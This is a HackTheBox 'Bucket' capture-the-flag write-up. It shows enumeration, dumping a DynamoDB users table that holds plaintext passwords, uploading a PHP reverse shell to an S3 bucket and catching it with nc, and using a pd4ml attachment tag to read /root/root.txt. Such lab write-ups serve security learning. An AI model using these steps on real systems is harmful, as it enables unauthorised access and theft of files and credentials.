---
layout: post
title:  "HackTheBox Bucket Writeup" 
tags: hackthebox s3-bucket dynamodb
categories: hackthebox active-machine 
rel-img: /assets/img/htb/bucket/bucket.png
description: Fantastic journey through s3 bucket and DynamoDB!!
---

### Hackthebox Bucket Writeup
![Bucket](/assets/img/htb/bucket/bucket.png)

## Abstract

Fantastic journey through s3 bucket and DynamoDB

## Summary
1. Initial foothold
  - Nmap recon
  - Gobuster enum
2. DynamoDB Web Shell
3. User Flag
4. DynamoDB Client exploitation
5. Root Flag

## Initial foothold

### Nmap recon

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 10:50 CEST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:50
Completed NSE at 10:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:50
Completed NSE at 10:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:50
Completed NSE at 10:50, 0.00s elapsed
Initiating Ping Scan at 10:50
Scanning 10.10.10.212 [4 ports]
Completed Ping Scan at 10:50, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:50
Completed Parallel DNS resolution of 1 host. at 10:50, 0.06s elapsed
Initiating SYN Stealth Scan at 10:50
Scanning 10.10.10.212 [1000 ports]
Discovered open port 22/tcp on 10.10.10.212
Discovered open port 80/tcp on 10.10.10.212
Completed SYN Stealth Scan at 10:50, 1.89s elapsed (1000 total ports)
Initiating Service scan at 10:50
Scanning 2 services on 10.10.10.212
Completed Service scan at 10:51, 6.12s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.212
Retrying OS detection (try #2) against 10.10.10.212
Retrying OS detection (try #3) against 10.10.10.212
Retrying OS detection (try #4) against 10.10.10.212
Retrying OS detection (try #5) against 10.10.10.212
Initiating Traceroute at 10:51
Completed Traceroute at 10:51, 0.06s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:51
Completed Parallel DNS resolution of 2 hosts. at 10:51, 0.07s elapsed
NSE: Script scanning 10.10.10.212.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 1.89s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:51
Completed NSE at 10:51, 0.00s elapsed
Nmap scan report for 10.10.10.212
Host is up, received echo-reply ttl 63 (0.053s latency).
Scanned at 2020-10-23 10:50:57 CEST for 22s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/23%OT=22%CT=1%CU=31562%PV=Y%DS=2%DC=T%G=Y%TM=5F9299
OS:87%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)
```

Nmap revealed that `port 22 and 80` was open with SSH and Apache2 webserver respectively running on. 

### Gobuster enum

I started by visiting web page at `bucket.htb` (add entry to my hosts file) where i found a simple Bucket Advertising Platform.

![bucket home page](/assets/img/htb/bucket/bucket-homepage.png)

In the source page i noticed that image was loaded from second level domain `s3.bucket.htb/adserver/...`

![bucket source page](/assets/img/htb/bucket/vhost.png)

so i added the entry to my hosts file, than i ran gobuster command and find a shell folder:

```
#gobuster dir -u http://s3.bucket.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1                                                                                                                                                                               
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                                                               
===============================================================
[+] Url:            http://s3.bucket.htb/                                                                                                                                                     
[+] Threads:        50                                                                                                                                                                        
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt                                                                                                              
[+] Status codes:   200,204,301,302,307,401,403                                                                                                                                               
[+] User Agent:     gobuster/3.0.1                                                                                                                                                            
[+] Timeout:        10s                                                                                                                                                                       
===============================================================
2020/10/29 17:47:50 Starting gobuster                                                                                                                                                         
===============================================================
/health (Status: 200)                                                                                                                                                                         
/shell    (Status: 200)
```
I opened browser at the path http://s3.bucket.htb/shell and found a `DynamoDB Web Shell`:

![dynamodb web shell](/assets/img/htb/bucket/bucket-s3-shell.png)

## DynamoDB Web Shell

I decided to install (and configure) aws CLI.

```
sh4ck@kali:~$ sudo apt-get install awscli
```
and configure it:
```
sh4ck@kali:~$ aws configure
AWS Access Key ID [None]: None
AWS Secret Access Key [None]: None
Default region name [None]: us-west-2
Default output format [None]: json
```

Reading htb official forum and after a google fu, i figured out to proceed with aws CLI and DynamoDB.

First of all i tried to list all table:

```
sh4ck@kali:~$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/
{
    "TableNames": [
        "users"
    ]
}
```
I found a user table so i explored it

```
sh4ck@kali:~$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

At this point i tried to create my bucket and check it  

```
sh4ck@kali:~$ aws --endpoint-url=http://s3.bucket.htb s3api create-bucket --bucket MYBUCK

sh4ck@kali:~$ aws --endpoint-url=http://s3.bucket.htb s3api list-buckets
{
    "Buckets": [
        {
            "Name": "mybuck",
            "CreationDate": "2020-10-23T10:13:06.086393+00:00"
        },
        {
            "Name": "adserver",
            "CreationDate": "2020-10-23T10:13:28.479408+00:00"
        }
    ],
    "Owner": {
        "DisplayName": "webfile",
        "ID": "bcaf1ffd86f41161ca5fb16fd081034f"
    }
}
```
Than i uploaded a php reverse shell to my bucket:

```
sh4ck@kali:~$ aws --endpoint-url=http://s3.bucket.htb s3 cp ~/Desktop/buckrev.php s3://mybuck
```
and checked the file uploaded to `http://s3.bucket.htb/mybuck/buckrev.php`. Anyway no got reverse shell.

So i uploaded my reverse shell to adserver bucket

```
sh4ck@kali:~$ aws --endpoint-url=http://s3.bucket.htb s3 cp ~/Desktop/buckrev.php s3://adserver
```

and browsing file at bucket.htb/buckrev.php i got reverse shell:

```
sh4ck@kali:~$ nc -nlvp 4545
listening on [any] 4545 ...
www-data@bucket:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## User Flag
User enumeration revealed me a user after enumerating roy... i tried to switch to this user with su command and password one of those found previously (from user table) and got roy shell (password was n2vM-<_K_Q:.Aa2.).
For a more stable shell i connected to bucket.htb through ssh and user roy, and got user.txt.

## DynamoDB Client exploitation 

After a bunch of  enumeration I figured out that i had to search into /var/www/bucket-app folder. Indeed index.php showed me something interesting:
```
roy@bucket:~$ cat /var/www/bucket-app/index.php 
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```
Analysing code it was clear that a post request to localhost, with "action=get_alerts", could dump items from alerts table to a pdf file.. It was so strange..

Because aws was installed in the system and an internal service port 8000 (web service) and port 4566 (aws service), i made a port forwarding:

```
sh4ck@kali:~$ ssh -L 8000:127.0.0.1:8000 roy@10.10.10.212
``` 

Based on index.php i created table alerts

```
sh4ck@kali:~$ aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5 \
        --endpoint-url=http://s3.bucket.htb
```

and an item named Exfiltrator

```
sh4ck@kali:~$ aws dynamodb put-item \
--table-name alerts  \
--item \
    '{"title": {"S": "Exfiltrator"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/root.txt</pd4ml:attachment>"}}' \
    --endpoint-url=http://s3.bucket.htb
```
## Root Flag

Next step was to trigger `pd4ml generation`:

```
sh4ck@kali:~$ curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v
```

than i downloaded file with:

```
sh4ck@kali:~$ wget http://127.0.0.1:8000/files/result.pdf
```
and got root.txt content inside pdf file.
